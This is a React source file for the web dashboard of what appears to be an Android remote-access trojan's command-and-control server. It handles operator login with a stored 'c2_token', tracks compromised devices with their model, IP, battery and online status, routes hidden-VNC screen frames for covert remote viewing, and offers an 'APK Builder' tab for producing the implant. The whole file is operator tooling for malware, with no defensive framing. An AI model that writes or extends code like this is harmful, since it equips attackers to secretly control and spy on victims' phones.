import { useState, useEffect, useRef, useCallback } from 'react';
import { api } from './lib/api';
import { panelConnect, panelDisconnect, on, send } from './lib/socket';
import Login from './components/Login';
import Sidebar from './components/Sidebar';
import DevicePanel from './components/DevicePanel';
import BuilderTab from './components/BuilderTab';

export default function App() {
  const [token, setToken] = useState(() => localStorage.getItem('c2_token'));
  const [wsStatus, setWsStatus] = useState('disconnected'); // connecting|connected|disconnected
  const [devices, setDevices] = useState([]);
  const [selectedId, setSelectedId] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [view, setView] = useState('devices'); // devices | builder

  // Route binary HVNC frames to the active HvncView
  const hvncHandlerRef = useRef(null);

  const handleLogin = useCallback(async (username, password) => {
    const res = await api.login(username, password);
    if (res.error) throw new Error(res.error);
    localStorage.setItem('c2_token', res.token);
    setToken(res.token);
  }, []);

  const handleLogout = useCallback(() => {
    panelDisconnect();
    localStorage.removeItem('c2_token');
    setToken(null);
    setDevices([]);
    setSelectedId(null);
    setWsStatus('disconnected');
  }, []);

  useEffect(() => {
    if (!token) return;

    setWsStatus('connecting');
    panelConnect(token);

    const offs = [
      on('connecting', () => setWsStatus('connecting')),
      on('connected',  () => { setWsStatus('connected'); send({ type: 'get_devices' }); }),
      on('disconnected', () => setWsStatus('disconnected')),

      on('devices', (devList) => {
        setDevices(devList);
      }),

      on('device_connected', ({ deviceId, info, ip }) => {
        setDevices(prev => {
          const exists = prev.find(d => d.id === deviceId);
          if (exists) return prev.map(d => d.id === deviceId ? { ...d, online: true, last_seen: new Date().toISOString() } : d);
          return [{ id: deviceId, model: info?.model || '', manufacturer: info?.manufacturer || '', android_version: info?.android_version || '', battery_level: -1, online: true, last_seen: new Date().toISOString(), created_at: new Date().toISOString() }, ...prev];
        });
      }),

      on('device_disconnected', ({ deviceId }) => {
        setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, online: false } : d));
      }),

      on('device_status_update', ({ deviceId, battery }) => {
        setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, battery_level: battery ?? d.battery_level } : d));
      }),

      on('binary_frame', ({ frameType, deviceId, payload }) => {
        if (deviceId === selectedId && hvncHandlerRef.current) {
          hvncHandlerRef.current(frameType, payload);
        }
      }),
    ];

    return () => { offs.forEach(off => off()); };
  }, [token, selectedId]);

  const selectedDevice = devices.find(d => d.id === selectedId) || null;

  if (!token) return <Login onLogin={handleLogin} />;

  return (
    <div style={{ display: 'flex', height: '100dvh', overflow: 'hidden', background: '#0a0a0f', position: 'relative' }}>

      {/* Mobile overlay */}
      {sidebarOpen && (
        <div
          style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 40 }}
          onClick={() => setSidebarOpen(false)}
        />
      )}

      <Sidebar
        devices={devices}
        selected={selectedId}
        onSelect={(id) => { setSelectedId(id); setSidebarOpen(false); }}
        onLogout={handleLogout}
        wsStatus={wsStatus}
        open={sidebarOpen}
        onClose={() => setSidebarOpen(false)}
      />

      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minWidth: 0 }}>
        {/* View switcher */}
        <div style={{
          display: 'flex', gap: 6, padding: '10px 14px',
          background: '#0f0f14', borderBottom: '1px solid #1e1e2a',
          alignItems: 'center', flexShrink: 0,
        }}>
          {[
            ['devices', 'Devices'],
            ['builder', 'APK Builder'],
          ].map(([k, name]) => (
            <button key={k} onClick={() => setView(k)}
              style={{
                padding: '6px 14px', borderRadius: 5, fontSize: 12, fontWeight: 600,
                letterSpacing: 0.5, cursor: 'pointer', border: '1px solid',
                background: view === k ? '#00613a' : 'transparent',
                borderColor: view === k ? '#00613a' : '#1e1e2a',
                color: view === k ? '#fff' : '#555',
              }}>{name}</button>
          ))}
        </div>

        {/* Top bar (mobile) */}
        <div style={{
          display: 'none',
          '@media(max-width:768px)': { display: 'flex' },
          padding: '10px 14px',
          background: '#0f0f14',
          borderBottom: '1px solid #1e1e2a',
          alignItems: 'center',
          gap: 10,
          flexShrink: 0,
        }} className="mobile-topbar">
        </div>

        {view === 'builder' ? <BuilderTab /> : selectedDevice
          ? <DevicePanel
              device={selectedDevice}
              hvncHandlerRef={hvncHandlerRef}
              onSidebarOpen={() => setSidebarOpen(true)}
            />
          : <EmptyState onSidebarOpen={() => setSidebarOpen(true)} devices={devices} wsStatus={wsStatus} />
        }
      </div>

      <style>{`
        @media (max-width: 768px) {
          .mobile-topbar { display: flex !important; }
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: #2a2a3a; border-radius: 2px; }
        input, button, select, textarea { font-family: inherit; }
      `}</style>
    </div>
  );
}

function EmptyState({ onSidebarOpen, devices, wsStatus }) {
  const online = devices.filter(d => d.online).length;
  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#333', gap: 12 }}>
      <button
        onClick={onSidebarOpen}
        style={{ display: 'none', padding: '8px 16px', background: '#1a1a26', border: '1px solid #2a2a3a', borderRadius: 6, color: '#888', fontSize: 13, cursor: 'pointer' }}
        className="show-mobile"
      >
        ☰ Devices ({online} online)
      </button>
      <div style={{ fontSize: 36, opacity: 0.15 }}>◈</div>
      <div style={{ fontSize: 13, color: '#333' }}>
        {wsStatus === 'connected' ? `${online} device${online !== 1 ? 's' : ''} online — select one` : wsStatus === 'connecting' ? 'connecting to server...' : 'server disconnected'}
      </div>
      <style>{`@media(max-width:768px){ .show-mobile{display:block!important} }`}</style>
    </div>
  );
}
